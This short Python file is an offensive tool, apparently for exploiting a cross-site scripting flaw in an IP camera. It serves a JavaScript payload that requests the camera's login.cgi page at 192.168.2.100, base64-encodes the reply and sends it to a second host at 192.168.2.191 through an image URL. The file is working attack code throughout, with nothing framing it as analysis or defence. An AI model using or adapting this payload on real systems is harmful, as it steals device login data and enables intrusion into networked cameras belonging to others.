import http.server
import socketserver

# Note: cam_ip here is 192.168.2.100 and http port 55170

class XssHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
            var req = new XMLHttpRequest();
            req.open("GET", "http://192.168.2.100:55170/login.cgi", false);
            req.send();
            new Image().src="http://192.168.2.191:81/"+btoa(req.response);
        ''')


if __name__ == '__main__':
    xss_server = socketserver.TCPServer(('', 80), XssHandler)
    xss_server.serve_forever()
